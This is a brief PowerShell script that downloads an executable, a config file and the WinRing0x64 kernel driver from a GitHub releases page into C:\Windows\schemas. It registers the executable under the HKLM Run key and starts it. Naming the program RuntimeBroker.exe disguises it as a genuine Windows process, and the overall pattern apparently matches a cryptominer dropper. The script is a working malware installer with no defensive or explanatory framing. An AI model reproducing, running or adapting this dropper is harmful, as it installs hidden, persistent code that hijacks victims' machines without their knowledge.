Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/config.json" -OutFile "C:\Windows\schemas\config.json"
Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe" -OutFile "C:\Windows\schemas\RuntimeBroker.exe"
Invoke-RestMethod -Uri "https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys" -OutFile "C:\Windows\schemas\WinRing0x64.sys" 

$programPath = "C:\Windows\schemas\RuntimeBroker.exe"

$command = "C:\Windows\schemas\RuntimeBroker.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command


Start-Process "C:\Windows\schemas\RuntimeBroker.exe"


